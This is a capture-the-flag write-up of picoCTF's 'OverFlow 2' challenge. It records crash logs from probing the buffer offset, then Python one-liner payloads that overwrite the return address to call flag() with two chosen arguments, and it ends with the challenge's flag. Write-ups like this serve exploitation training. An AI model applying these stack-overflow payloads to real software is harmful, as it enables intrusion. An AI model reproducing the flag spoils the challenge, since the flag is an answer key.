OverFlow 2: Binary Exploitation

Now try overwriting arguments. Can you get the flag from this program?
You can find it in /problems/overflow-2_2_47d6bbdfb1ccd0d65a76e6cbe0935b0f on the shell server. Source.

----------------------------------------

#define BUFSIZE 176
#define FLAGSIZE 64

if (arg1 != 0xDEADBEEF)
    return;
if (arg2 != 0xC0DED00D)
    return;


* disassemble:

080485e6 <flag>:
...
08048676 <vuln>:
...
080486b5 <main>:
...


* need input like:

    buffer + &flag() + address +  arg1 + arg2


* trial and error locally

    python -c 'print "a"*176' | ./vuln; dmesg | tail -1
    [49811.940183] vuln[12246]: segfault at 65656565 ip 0000000065656565 sp 00000000ffffced0 error 14

    python -c 'print "a"*176 + "bbbb"' | ./vuln; dmesg | tail -1
    [50062.107345] traps: vuln[12355] trap invalid opcode ip:8048700 sp:ffffced0 error:0 in vuln[8048000+1000]

    python -c 'print "a"*176 + "bbbb" + "cccc" + "dddd"' | ./vuln; dmesg | tail -1
    Illegal instruction (core dumped)
    [49810.373059] traps: vuln[12241] trap invalid opcode ip:8048700 sp:ffffced0 error:0 in vuln[8048000+1000]

    python -c 'print "a"*176 + "bbbb" + "cccc" + "dddd" + "eeee"' | ./vuln; dmesg | tail -1
    Segmentation fault (core dumped)
    [49811.940183] vuln[12246]: segfault at 65656565 ip 0000000065656565 sp 00000000ffffced0 error 14


needs extra 12 bytes before can change eip
so input like:

    'a'*188 + &flag() + addr + arg1 + arg2

    python -c 'print "a"*188 +  "\xe6\x85\x04\x08" + "bbbb" + "\xef\xbe\xad\xde" + "\x0d\xd0\xde\xc0"' | ./vuln
    prints flag, then
    Segmentation fault (core dumped)

clean inject with exit

    exit address
    8048631:	e8 3a fe ff ff       	call   8048470 <exit@plt>

    python -c 'print "a"*188 +  "\xe6\x85\x04\x08" + "\x31\x86\x04\x08" + "\xef\xbe\xad\xde" + "\x0d\xd0\xde\xc0"' | ./vuln

    prints flag and exits, no crash

----------------------------------------

picoCTF{arg5_and_r3turn5ce5cf61a}

